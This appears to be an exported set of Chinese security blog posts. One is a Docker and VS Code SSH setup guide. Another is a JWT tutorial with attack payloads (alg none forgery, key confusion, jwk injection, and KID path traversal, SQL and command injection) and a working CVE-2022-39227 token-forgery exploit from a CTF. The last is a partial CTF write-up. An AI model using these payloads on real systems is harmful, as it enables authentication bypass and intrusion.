[{"title":"Build-Your-Remote-Linux-Docker","url":"/2022/11/29/Build-Your-Remote-Linux-Docker/","content":"\nAuthor ：探姬原文于语雀发布，地址为：https://www.yuque.com/probius/cs_wp/fegz0w\n\n本文也有配套视频，建议结合食用：(给个三连吧www)https://www.bilibili.com/video/BV1684y1z7L6\nAbout本文档完整的流程可以帮助您在 Kali Linux上完成Docker环境，并且基于Vscode的Remote功能，利用SSH协议，构建 VSCODE + SSH + Docker 的工作流，提高效率。同样，本文档也考虑了非Kali，用于开发&#x2F;生产环境的 Ubuntu &#x2F; Debian 系统 ，如果您想要在开发&#x2F;生产中使用该工作流，可以直接从 Get Docker或者 Build SSH＋vscode + docker Workflow章节开始。笔者水平有限，错误疏漏之处在所难免，烦请各位师傅斧正。以及非常感谢 **陈橘墨(@*Randark_JMT*)师傅**提供的帮助。\nGet KaliDownload在Kali官网下载即可，建议直接下载封装好的虚拟机版本：解压下载好的压缩包到您想要放置虚拟机的位置，然后双击配置文件直接打开自动添加，或者在VMware中手动添加：添加完成后，启动即可：（当然，作为DockerRuner，您可能需要设置一个稍微大点的内存值）\nChangeResource？笔者并不建议换源，Kali官方源的速度还是不错的，换源可能会导致您软件管理出现问题。\nGet DockerInstalldocker安装目前有两个版本，一个是官方的docker.ce版本，一个是有Debian团队维护的**docker.io**版本。之前有争议说 docker.io 是旧版本的docker 而新版的docker是 dockers.ce然而docker.io的版本有时会比docker.ce高，事实上，两者只是负责维护的组织不同，前者是Debian官方维护，后者则为Docker官方维护，并没后新旧之分：\ndocker.io该版本由Debian团队维护，采用 apt 的方式管理依赖安装过程：\nsudo apt-get update\n\n\nsudo apt install docker.io\n\n\ndocker.ce由docker官方维护的版本，采用 go 的方式管理依赖，如果您要在开发&#x2F;生产环境中使用docker，推荐使用该版本。如果您的Linux版本为Ubuntu&#x2F;Debian，可以使用一下命令自动安装：\nwget -qO- https://get.docker.com/ | sh\n\n（注意，Docker并不支持Kali一键安装，同样笔者也不推荐您用kali作为开发生产环境，Kali满足日常需要，使用io版本即可，当然您也可以使用.ce版本的手动安装）手动安装：可以参考Docker官方的 Docker Engine安装步骤：但是该步骤在 Kali Linux上面可能会存在一定问题，以Kali为例，完整的按照流程如下：\nsudo apt-get updatesudo apt-get install \\    ca-certificates \\    curl \\    gnupg \\    lsb-release\n\n选项选择Yes就好。然后按照官网提示，添加Docker官方的 GPG key：\nsudo mkdir -p /etc/apt/keyringscurl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n\n然后设置仓库：\necho \\  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\  $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n然后开始安装：\nsudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n随后，如果您是Kali Linux，您可能会遭遇以下报错：\n这是由于Docker官方并没有提供直接支持Kali的源，所以我们使用Debian的源就好：\nprintf &quot;%s\\n&quot; &quot;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&quot; |\\sudo tee /etc/apt/sources.list.d/docker-ce.list\n\n并且添加对应的密钥：\ncurl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -\n\n注意不要忘了给密钥相应权限：\nsudo chmod a+r /etc/apt/keyrings/docker.gpg\n\n此时再跑一次 sudo apt-get update:\nsudo apt-get update\n\n您可能会遇到一个找不到的源，这个是正常的。接下来安装docker：\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n就能正常获取了：安装完成后，执行hello-world，得到图示则安装成功。\nsudo docker run hello-world\n\n\nDockerHub尝试登录您的DockerHub账号：如果出现类似错误，请手动配置DNS：\nsudo vim /etc/resolv.conf\n\n保存，再次尝试即可成功登录：\nBuild SSH＋vscode + docker Workflow该步骤适用于支持SSH协议的Linux（废话，哪个Linux没有个SSH），除了在本地的Kali或者其他Linux上面构建，也支持远程构建该工作流。\nStart SSH ServiceKali LinuxKali虚拟机默认是没有开启ssh服务的 （ssh状态：/etc/init.d/ssh status）所以需要手动启动一下：\nsudo /etc/init.d/ssh start \n\n当然，为了方便，我们将ssh添加到开机自启中：\nsudo update-rc.d ssh enable# Or use:systemctl enable ssh.service\n\n启动之后就可以开始后面的步骤了。\nUbuntu由于ubuntu默认不自带openssh-server，所以这里需要手动安装。安装openssh-server：\nsudo apt-get install openssh-server\n\n安装完成后启动服务：\nsudo service ssh start\n\nGet Remote - SSH为了使用vscode的远程ssh功能 您可能需要在扩展中安装Remote - SSH插件：\nLet Vscode Connect to host连接方式有两种：密码连接 和 ssh的公私钥。一般情况下我们使用密码连接，这样的方法安全性较低，而且每次连接和每次切换目录的时候都会要求输入密码，所以在确保能够密码连接情况下，我们可以进一步使用公私钥验证的方式来提升安全性和优化操作友好性。\nUsing password connection打开vscode，点击左下角的远程连接（绿色的部分）接着在弹出的窗口中选择 Connect to Host选择 Add New SSH Host：按照要求输入对应的指令：IP可通过 ip a 获取ssh kali@192.168.28.145 -A保存位置默认第一个就好：然后连接：选择对应的系统：选择继续：输入密码：初始化完成后就连接上了：\nUsing public and private keysCreate public and private keys首先在本机上生成对应的公钥私钥：\nssh-keygen\n\n\nEnter file in which to save the key (C:\\Users\\Probius/.ssh/id_rsa):\n\n输入保存路径，如果为空默认为 C:\\Users\\USERNAME/.ssh/id_rsa，这里笔者直接输入了名字，让其以该名字直接保存在当前目录\nEnter passphrase (empty for no passphrase):\n\n输入私钥密码，为空则没有\nEnter same passphrase again:\n\n注意：如果您使用了私钥密码，那么在进行ssh登录的时候，会提示您输入私钥密码，相当于再使用公私钥登录的情况下又加了一层密码，安全性有很大的提升，但是这样会变得和密码登录一样每次都要输入，这里笔者建议，如果是本地一路回车就好了，如果是远程资源的管理，可以综合安全性考虑生成过后，得到的id_rsa.pub(Kali_test.pub)是公钥，id_rsa(Kali_test)是**私钥 **将得到的私钥放在我们的.ssh(C:\\Users\\USERNAME.ssh)中。(您也可以在生成的时候就让他防止在此，当然这并不是重点）\nConfiguring Remote Host将得到的公钥上传到 Kali&#x2F;服务器中对应用户的.ssh文件夹中(请确保该文件夹至少有700的权限)：（注意 kali默认没有该文件夹，需要用户手动创建，并且赋700权限 mkdir ~/.ssh ）在此处打开终端，用公钥文件来生成 authorized_keys：\ncat id_ras.pub &gt;&gt; authorized_keys# 此处既 cat Kali_test.pub &gt;&gt; authorized_keys\n\n由于Linux系统对.ssh拥有比较严格的权限限制，请确保权限配置正确：\nsudo chmod 600 authorized_keyssudo chmod 700 ~/.ssh\n\n编辑ssh配置文件\nsudo vim /etc/ssh/sshd_config\n\n确保拥有以下条目：\nRSAAuthentication yesPubkeyAuthentication yes\n\n注意Kali的ssh默认配置是没有上诉两项的，需要自行添加：然后搞定一切后 重启SSH服务：\nsudo service ssh restart\n\nLinux部分的配置这样就搞定啦~（在您确保您的连接无误后，如果是服务器等远程设备，可以在config中关闭密码登录以提升安全性：PasswordAuthentication no）\nConfiguring Local Host然后是Windows，也就是vscode这边的配置：添加NewHost：使用：\nssh USERNAME@IP -i C:\\\\Users\\\\Probius\\\\.ssh\\\\RAS_ID\n\n（注意使用指令添加时，务必使用双斜杠）当然，也可以在已经添加的配置文件上改：\nHost 192.168.28.145\tHostName 192.168.28.145\tUser kali\tIdentityFile C:\\Users\\Probius\\.ssh\\Kali_test\n\n如果操作无误，且没有设置私钥密码，那么点击连接之后无需其他额外操作即可连接；如果设置了私钥密码，那么按照提示输入即可。\nOther_About SSH key login关于ssh密钥登录的更多知识可以看这一篇文章：\nGet The Docker ExtensionInstall extension（当然 如果显示的是 安装也是一样的）\nSolve error如果您使用自动安装，应该不会遇到该问题，自动安装的sh会自动完成用户组添加的操作。由于权限原因，我们可能无法访问到 /var/run/docker.sock\nBy add user group一劳永逸的解决权限问题，将当前用户组添加到docker组即可。创建docker用户组，默认安装时就会自动创建，所以执行可能会显示exist\nsudo groupadd docker \n\n添加当前用户到该组：\nsudo usermod -aG docker $&#123;USER&#125; \n\n然后重新启动容器服务：\nsudo systemctl restart docker \n\n再次重新登入即可，如果重新登录之后依旧报错无法读取，请尝试重启：\nreboot\n\nBy chmod也可以使用sudo chmod 777 /var/run/docker.sock，但是每次重启之后权限都会重置，不推荐然后就能正常访问了：\nStart Use（以下操作使用DockerHub演示）因为在安装Docker的时候登录过DockerHub所以这里连接之后，系统会自动获取您的凭证，您可以在这查看您的DockerHub仓库：当然，您也可以添加其他仓库，具体的用法可以参考官方文档：\nPull Image当然 对于自己仓库的镜像还是比较方便的233：当然如果是公开镜像的话 还是免不了指令啦，不过还是比较方便的，旁边就是终端：完成之后就能在IMAGES栏看到了：\nRun Docker运行容器有两个选项Run &#x2F; Run Ineractive\nRun默认后台运行，Run执行后效果和在Linux执行 -d的效果相同：\nRun Interacitve该选项运行执行后，除了运行容器，还会跳到容器的汇总shell处，这里会实时打印容器日志，效果和 View Log效果相同：\nView Log直达容器后台日志，如果在运行的时候选择Run Interacitve那么也会跳转到该log页面。\nAttach Shell右键选中之后可以直接建立一个容器内部的shell，省去docker exec -i -t ID /bin/bash\nEdit Container在CONTAINERS中下拉一个容器的file可以对其进行查看和编辑：可以看到对于容器来说 修改是即时的（支持热更新的）\nAttach Container（Advanced Edit？）我们也可以用Vscode建立类似SSH的连接，直接连接到整个容器：并且操作同步：而且容器支持文件拖拽，相比单纯的COPY指令 拥有更好的体验（个人感觉\nPort Forward通过SSH直接将远程端口转发到本地，免除防火墙困扰ww一般来讲在您启动容器的时候 vscode会自动配置 当然为了更好的区分和避免冲突 也可以手动分配配置如图：\nOpen in Borrow如果您配置完成了端口转发(或者vscode自动为您完成配置）那么点击Open in Borrow将在您的默认浏览器中快速打开该端口对应的页面：\nOther其他用法，就请佬们自行探索啦ww\nExtensionRecommendThunder ClientThunder Client is a lightweight Rest API Client Extension for Visual Studio Code, hand-crafted by Ranga Vadhineni with simple and clean design.要注意的是 该插件基于远程运行（既本体在虚拟机&#x2F;服务器上），在测试的时候请确保url指向正确。\n","categories":["CTF","Develop"],"tags":["Docker"]},{"title":"From Jwt To The XiangYunCup FunWeb","url":"/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/","content":"About JWTWhat is JWTJson Web Token(JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。此信息可以验证和信任，因为它足数字签名的。JWT可以使用密钥(使用 HMAC算法)或便用RSA或 ECDSA 的公钥&#x2F;私钥对进行签名。\n\n注意：本文的重心并不在介绍JWT上，所以在官方文本的基础上会有一些删减。\n如需了解更多，可以访问起官方网站，翻阅对应的文献资料：\nhttps://jwt.io/introduction\nhttps://jwt.io/\n\nJWT formatJWT的格式大致如下：\nHeader.Payload.Signature\n\n\n对于任意JWT令牌，我们可以在jwt.io官网或者其他jwt解码工具查看详细：\n\nHeaderJWT头是一个描述JWT元数据的JSON对象，alg属性表示签名使用的算法，默认为HMAC SHA256（写为HS256）；typ属性表示令牌的类型，JWT令牌统一写为JWT。\n最后，使用Base64 URL算法将上述JSON对象转换为字符串保存\n&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;\n\nPayload有效载荷部分，是JWT的主体内容部分，也是一个JSON对象，包含需要传递的数据。 \nJWT指定七个默认字段供选择：\niss：发行人nbf：在此之前不可用(时间戳)iat：发布时间(时间戳)exp：到期时间(时间戳)sub：主题aud：用户jti：JWT ID用于标识该JWT\n\n这些预定义的字段并不要求强制使用。\n除以上默认字段外，我们还可以自定义私有字段，一般会把包含用户信息的数据放到payload中，如下例：\n&#123;  &quot;exp&quot;: 1667141915,  &quot;iat&quot;: 1667141615,  &quot;is_admin&quot;: 0,  &quot;is_login&quot;: 1,  &quot;jti&quot;: &quot;5vpXRcirMlzlMPnx0sSX7w&quot;,  &quot;nbf&quot;: 1667141615,  &quot;password&quot;: &quot;f61d&quot;,  &quot;username&quot;: &quot;f61d&quot;&#125;#################################################################[+] exp = 1667141915    ==&gt; TIMESTAMP = 2022-10-30 22:58:35 (UTC)[+] iat = 1667141615    ==&gt; TIMESTAMP = 2022-10-30 22:53:35 (UTC)[+] is_admin = 0[+] is_login = 1[+] jti = &quot;5vpXRcirMlzlMPnx0sSX7w&quot;[+] nbf = 1667141615    ==&gt; TIMESTAMP = 2022-10-30 22:53:35 (UTC)[+] password = &quot;f61d&quot;[+] username = &quot;f61d&quot;\n\nSignature签名哈希部分是对上面两部分数据签名，需要使用base64编码后的header和payload数据，通过指定的算法生成哈希,公式如下：\nHMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)\n\n注意的是，如果header部分中，参数alg置空，则无该部分(我们也称其为Nonsecure JWT)。\nAll IN在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用.分隔，就构成整个JWT对象\n注意JWT每部分的作用，在服务端接收到客户端发送过来的JWT token之后：\n\nheader和payload可以直接利用base64解码出原文，从header中获取哈希签名的算法，从payload中获取有效数据\nsignature由于使用了不可逆的加密算法，无法解码出原文，它的作用是校验token有没有被篡改。服务端获取header中的加密算法之后，利用该算法加上secretKey对header、payload进行加密，比对加密后的数据和客户端发送过来的是否一致。注意secretKey只能保存在服务端，而且对于不同的加密算法其含义有所不同，一般对于MD5类型的摘要加密算法，secretKey实际上代表的是盐值\n\nJWT ClassificationNonsecure JWTheader部分中，参数alg置空的JWT。\nJWSJWS ，也就是JWT Signature，其结构就是在之前nonsecure JWT的基础上，在头部声明签名算法，并在最后添加上签名。\n创建签名，是保证jwt不能被他人随意篡改。\n我们通常使用的JWT一般都是JWS\n为了完成签名，除了用到header信息和payload信息外，还需要算法的密钥，也就是secretKey。\n加密的算法一般有两类：\n\n对称加密：secretKey指加密密钥，可以生成签名与验签\n非对称加密：secretKey指私钥，只用来生成签名，不能用来验签(验签用的是公钥)\n\nJWT的密钥或者密钥对，一般统一称为JSON Web Key，也就是JWK\n如需了解JWT的签名算法可以前往其官网查阅：\nhttps://jwt.io/libraries\nUse如果您想知道如何将JWT用于开发中，请移步另一篇文章：(写作中……)\nVerificationJWT的后端验证是比较多样的，大概的流程可以参考下图：\n\n这也是说JWT的后端验证多样的原因，如何利用JWT的信息和signature综合的去验证JWT的有效性，在开发者选择使用JWT的适合就要做好相应的准备——生成和验证是一体的。\nCommon Security risk of JWT在简单了解了JWT之后，我们来看看JWT常见的一些安全风险：\n敏感信息泄露如果不当的使用Header和Payload部分，在其中存储一些敏感信息，可能会产生一定安全风险，因为两者只经过简单的base64编码。\n当然这种在实际环境中很少见，但是却能成为个别CTF比赛的web签到题的考点（\n签名算法替换如果应用不限制 JWT中使用的算法类型，导致算法类型可控，这样会带给JWT巨大的安全风险。\n签名算法置空（CVE-2015-2951）我们知道在JWT的头部中声明了token的类型和签名用的算法：\n&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;\n\n上header指定了签名算法为HS256，意味着服务端利用此算法将header和payload进行加密，形成signature，同时接收到token时，也会利用此算法对signature进行签名验证。\n如果后端程序信任来源的JWT头部，那么当我们改变器头部算法，将其置空设置为\nNone\n\n那么服务端接收到token后会将其认定为无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token。\n当然这一切的前提是，后端信任前端。\n比如2022年首届数据安全题目中的一道web题，我们就可以通过该方法伪造token。\n# 可以通过令algorithm为空，绕过对签名和密钥的检验import jwtpayload = &#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;token = jwt.encode(payload=payload,algorithm=None,key=None)print(token)&#x27;&#x27;&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.&#x27;&#x27;&#x27;\n\n\n非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)HMAC和RSA是JWT比较常见的两种算法。\nHMAC：token使用密钥签名，然后使用相同的密钥进行验证。（对称）\nRSA    ：token将首先使用私钥创建，然后使用相应的公钥进行验证。（非对称）\n对于两者，密钥和私钥都要保密，因为签名和校验依赖它们。\n这里假设一个网站使用RSA生成和验证token，那么这里会有两个变量参与：私钥Prit和公钥Pub。\n如果签名算法可控，我们将算法头改为HMAC，使用RSA的公钥Pub来生成一个token，那么我们将构造好的JWT发送回去时，后端验证查询则会用RSA的公钥Pub以HMAC的算法验证方式来验证token。\n当然如果该漏洞存在，那么对于使用非对称加密的token，我们都可以尝试这样的方法，比如RS256变成HS256，比如这一道CTF题目：\nhttps://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/\n签名未校验&#x2F; 无效签名某些服务端并未校验JWT签名，可以尝试修改signature后(或者直接删除signature)，亦或者直接修改payload。\n找到一个只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。\n比如：\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicHJvYml1cyIsImFjdGlvbiI6InByb2ZpbGUifQ.5GVEWIw7-IdM9fQMt6H5Wxpmp1HpnyQb33CsXnZ9qKM\n\n\n如果我们直接修改payload段，使用修改后的token重放，如访问页面正常，则说明漏洞存在。\n伪造密钥(CVE-2018-0114)jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。\n比如CVE-2018-0114： \nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114\n攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。\n比如：\n&#123;  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;RS256&quot;,  &quot;jwk&quot;: &#123;    &quot;kty&quot;: &quot;RSA&quot;,    &quot;kid&quot;: &quot;TEST&quot;,    &quot;use&quot;: &quot;sig&quot;,    &quot;e&quot;: &quot;AQAB&quot;,    &quot;n&quot;: &quot;oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ&quot;  &#125;&#125;\n\n签名密钥爆破按照JWT的结构，我们是可以得知其使用的签名算法的，如果可以爆破出对应的密钥，我们就能随意的”伪造”token了。\n这里以HMAC签名举例：\nHMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。因此，HMAC JWT破解是离线的，通过JWT破解工具，可以快速检查已知的泄漏密码列表或默认密码。\n工具会在下边介绍。\n泄露密钥这个一般得打组合拳，配合如目录遍历、XXE、SSRF等可以读取存储密钥值文件漏洞，这样就可以窃取密钥并签署任意token。\nKID操控KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。KID参数的正确用法如下所示：\n&#123;    &quot;alg&quot;: &quot;HS256&quot;,    &quot;typ&quot;: &quot;JWT&quot;,    &quot;kid&quot;: &quot;1&quot;        //使用密钥1验证token&#125;\n\n由于此字段是由用户控制的，因此可能会被恶意操纵并导致危险的后果。\n目录遍历由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。\n&quot;kid&quot;: &quot;../../public/css/main.css&quot;   //使用公共文件main.css验证token\n\n这样我们就可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。\nSQL注入KID也可以用于在数据库中检索密钥。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。\n&quot;kid&quot;:&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;  //Use a string &quot;key&quot; Authentication token\n\n上面这个注入会导致应用程序返回字符串“ key”,\n因为数据库中不存在名为”aaaaaaa”的密钥，然后使用字符串“ key”作为密钥来认证token。\n命令注入有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。一些函数就能给此类型攻击可乘之机，比如Ruby open（）。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：\n&quot;key_file&quot; | whoami;\n\n类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似system()，exec()的函数时，都会产生此种漏洞。\n其他头部参数操控除KID外，JWT标准还能让开发人员通过URL指定密钥。\nJKU头部参数JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。\njku URL-&gt;包含JWK集的文件-&gt;用于验证令牌的JWK\n\n操纵X5U，X5C URL同JKU或JWK头部类似，x5u和x5c头部参数允许攻击者用于验证Token的公钥证书或证书链。x5u以URI形式指定信息，而x5c允许将证书值嵌入token中。\nJWTtool如果您需要对您使用JWT的网站进行安全测试，这里也有对应的工具，比如JWTtool，上述常见的JWT漏洞都可以使用该工具进行利用：\nhttps://github.com/ticarpi/jwt_tool\n同时你也能在该项目的Wiki网站上获取更多jwt的知识：\nhttps://github.com/ticarpi/jwt_tool/wiki\n2022 XiangyunCup FunWeb我们来看看2022年祥云杯的Web题——FunWeb。\n这道题并没有考察传统的JWT漏洞 而是选择一个比较新的 1day (CVE-2022-39227 )来出题。\n经典的开局一个登录框，登录页面抓包后先跑了admin的弱口令，当然现在的题一般没这么容易，并没有结果。\n老老实实注册进去，有两个可以点的，一个是查看flag，一个是查看成绩，点击之后发现都需要admin身份，所以抓包分析看到了一下，发现xxx.yyy.zzz的token结构，下意识就去jwt.io解码了：\n\n从payload可以判断大概这里就是突破点。\n当然面对这样一道JWT的题目，常规攻击手段肯定是首选，不过这样的题目，如果常规打不下来，就得考虑在github上面找commit了。\n所以在一天常规攻击无果后，于是开始找最近有关jwt的day，然后队里另外一位师傅翻到了python jwt的1day，也就是CVE-2022-39227\nhttps://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\n拉到最后我们可以看到作者在test中提供了漏洞POC：\n&quot;&quot;&quot; Test claim forgery vulnerability fix &quot;&quot;&quot;from datetime import timedeltafrom json import loads, dumpsfrom test.common import generated_keysfrom test import python_jwt as jwtfrom pyvows import Vows, expectfrom jwcrypto.common import base64url_decode, base64url_encode@Vows.batchclass ForgedClaims(Vows.Context):    &quot;&quot;&quot; Check we get an error when payload is forged using mix of compact and JSON formats &quot;&quot;&quot;    def topic(self):        &quot;&quot;&quot; Generate token &quot;&quot;&quot;        payload = &#123;&#x27;sub&#x27;: &#x27;alice&#x27;&#125;        return jwt.generate_jwt(payload, generated_keys[&#x27;PS256&#x27;], &#x27;PS256&#x27;, timedelta(minutes=60))    class PolyglotToken(Vows.Context):        &quot;&quot;&quot; Make a forged token &quot;&quot;&quot;        def topic(self, topic):            &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;            [header, payload, signature] = topic.split(&#x27;.&#x27;)            parsed_payload = loads(base64url_decode(payload))            parsed_payload[&#x27;sub&#x27;] = &#x27;bob&#x27;            parsed_payload[&#x27;exp&#x27;] = 2000000000            fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))            return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;        class Verify(Vows.Context):            &quot;&quot;&quot; Check the forged token fails to verify &quot;&quot;&quot;            @Vows.capture_error            def topic(self, topic):                &quot;&quot;&quot; Verify the forged token &quot;&quot;&quot;                return jwt.verify_jwt(topic, generated_keys[&#x27;PS256&#x27;], [&#x27;PS256&#x27;])            def token_should_not_verify(self, r):                &quot;&quot;&quot; Check the token doesn&#x27;t verify due to mixed format being detected &quot;&quot;&quot;                expect(r).to_be_an_error()                expect(str(r)).to_equal(&#x27;invalid JWT format&#x27;)\n\n注意这一点注释：&quot;Use mix of JSON and compact format to insert forged claims including long expiration&quot;可以得知，这个漏洞的本质就是利用 json格式的注⼊  \n如果稍加改造，我们就可以获得一个EXP：\nfrom datetime import timedeltafrom json import loads, dumpsfrom common import generated_keysimport python_jwt as jwtfrom pyvows import Vows, expectfrom jwcrypto.common import base64url_decode, base64url_encodedef topic(topic):    &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;    [header, payload, signature] = topic.split(&#x27;.&#x27;)    parsed_payload = loads(base64url_decode(payload))    parsed_payload[&#x27;is_admin&#x27;] = 1    parsed_payload[&#x27;exp&#x27;] = 2000000000    fake_payload = base64url_encode(        (dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))    # print (header+ &#x27;.&#x27; +fake_payload+ &#x27;.&#x27; +signature)    # print (header+ &#x27;.&#x27; + payload+ &#x27;.&#x27; +signature)    return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;originaltoken = &#x27;&#x27;&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxNDE5MTUsImlhdCI6MTY2NzE0MTYxNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiI1dnBYUmNpck1semxNUG54MHNTWDd3IiwibmJmIjoxNjY3MTQxNjE1LCJwYXNzd29yZCI6ImY2MWQiLCJ1c2VybmFtZSI6ImY2MWQifQ.cqQ2RVegORBfB_fo33birEJs8Tw8WDM7wIYwfXz_BpW6gQG99cl-DePmP6iNx5Mf0aCwDcuqS-wOXjis7JVmhpf8dmdYkP_gLvYMULpPcFX03j70Cu3bhMWSAGUMjt_IFGQ1-xfwYp1LI9SWAlBM5wDPCh-gi96abRDvhRW-c-6mFul2us_XKl7kyceT2fY2ABrcJRSKA91kLm3ZOcD4FA6yuHMyKVfmN9RqPtzvvUVutniv03XPFTGIzHudzswRc0b3nN-XMsnyi_Ca62T8CVb1MMEDPVlDM7CDJmJXGfoNimkrOhPi22SItpv4tO7u-bbene3PpvW1Lv7UEQeDBg&#x27;&#x27;&#x27;topic = topic(originaltoken)print(topic)\n\n利用生成的json当作token传参即可绕过：\n\nJWT的部分其实到这就结束了，后面如何拿flag就涉及到grahql的一个注入了，如果有时间，我会在下一篇文章总结一些SQL注入的知识。\nFrom FunWeb to CVE-2022-39227 vulnerability analysis本来还想着要分析，最近时间不是很够，敲好J1an师傅直接把文档炫我嘴里了（，\n\n\n那这里原理分析我就直接使用J1an师傅的文章啦：\n原文地址：https://forum.butian.net/share/1990 过审了所以添上了ww\n奇安信攻防社区-CVE-2022-39227漏洞分析.pdf\nOther Jwt topics[HFCTF2020]EasyLogin该WriteUp来源：https://www.jianshu.com/p/0f76e1c69e33\n复现环境：[https://buuoj.cn/challenges#[HFCTF2020\\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)https://www.ctfhub.com/#/challenge\n题解运行环境发现是一个登录页面，直接登录显示Cannot read property &#39;split&#39; of undefined，需要先注册再登陆。使用注册的普通账号登录，发现get flag按钮，点击提示permission denied，无权限，那么此题的方向应该是伪造成一个高权限账户。截取登录包，发现两处可疑authorization校验字段，Cookie也存在sses.aok的校验\n\n可以看到xxx.yyy.zzz的结构，解码可知为jwt\n\n通过查看源码，发现&#x2F;static&#x2F;js&#x2F;app.js 页面存在提示\n/** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD */\n\nkoa-static 错误配置的源码泄露\n说明 app.js 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码\n继续分析根目录的app.js，发现代码引用了两个当前目录的文件\nconst rest = require(&#x27;./rest&#x27;);const controller = require(&#x27;./controller&#x27;);\n\n说明存在rest.js和controller.js文件\n访问rest.js发现同样一个路径前缀 api\nconst pathPrefix = &#x27;/api/&#x27;;\n\n访问controller.js看到下面的代码\n遍历在controllers文件夹下的以.js结尾的文件，并且引入文件添加在router中，推断controllers文件夹下存在一个api.js文件\nfunction addControllers(router, dir) &#123;    fs.readdirSync(__dirname + &#x27;/&#x27; + dir).filter(f =&gt; &#123;        return f.endsWith(&#x27;.js&#x27;);    &#125;).forEach(f =&gt; &#123;        const mapping = require(__dirname + &#x27;/&#x27; + dir + &#x27;/&#x27; + f);        addMapping(router, mapping);    &#125;);&#125;module.exports = (dir) =&gt; &#123;    const controllers_dir = dir || &#x27;controllers&#x27;;    const router = require(&#x27;koa-router&#x27;)();    addControllers(router, controllers_dir);    return 